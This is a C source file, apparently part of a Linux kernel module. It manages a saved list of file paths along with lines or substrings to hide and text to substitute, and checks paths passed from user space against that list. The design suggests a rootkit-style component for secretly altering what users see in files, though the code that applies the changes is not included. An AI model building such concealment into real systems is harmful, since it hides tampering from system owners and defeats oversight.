#include "alterate_api.h"

#include "config.h"
#include "ulist.h"

struct ulist alt_list;

int alterate_init(void) {
    int ret;

    ulist_init(&alt_list, ALTERATE_CFG_FILE);
    ret = ulist_load(&alt_list);
    if (ret < 0)
        return ret;
    return SUCCESS;
}

void alterate_exit(void) {
    ulist_save(&alt_list);
    ulist_clear(&alt_list);
}

int alterate_add(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst) {
    int ret;
    char payload[512];
    char modpath[256];

    if (strcmp(path, "/") == 0)
        return -EINVAL;

    if (strlen(path) >= sizeof(modpath))
        return -ENAMETOOLONG;
    strscpy(modpath, path, sizeof(modpath));

    size_t len = strlen(modpath);
    if (len > 1 && modpath[len - 1] == '/') {
        modpath[len - 1] = '\0';
    }

    scnprintf(payload, sizeof(payload), "%d:%s:%s:%s", hide_line, hide_substr ?: "", src ?: "", dst ?: "");

    ret = ulist_add(&alt_list, modpath, 0, payload);
    if (ret < 0)
        return ret;

    ret = ulist_save(&alt_list);
    if (ret < 0)
        return ret;

    return SUCCESS;
}

int alterate_remove(const char *path) {
    int ret;

    ret = ulist_remove(&alt_list, path);
    if (ret)
        return ret;

    ret = ulist_save(&alt_list);
    if (ret < 0)
        return ret;

    return SUCCESS;
}

int alterate_contains(const char __user *u_path) {
    char *k_path;
    long n;
    int blocked = 0;

    if (!u_path)
        return 0;

    k_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!k_path)
        return 0;

    n = strncpy_from_user(k_path, u_path, PATH_MAX);
    if (n <= 0) {
        kfree(k_path);
        return blocked;
    }

    if (n == PATH_MAX)
        k_path[PATH_MAX - 1] = '\0';

    blocked = ulist_contains(&alt_list, k_path);

    kfree(k_path);
    return blocked;
}

int alterate_list_get(char *buf, size_t buf_size) {
    return ulist_list(&alt_list, buf, buf_size);
}
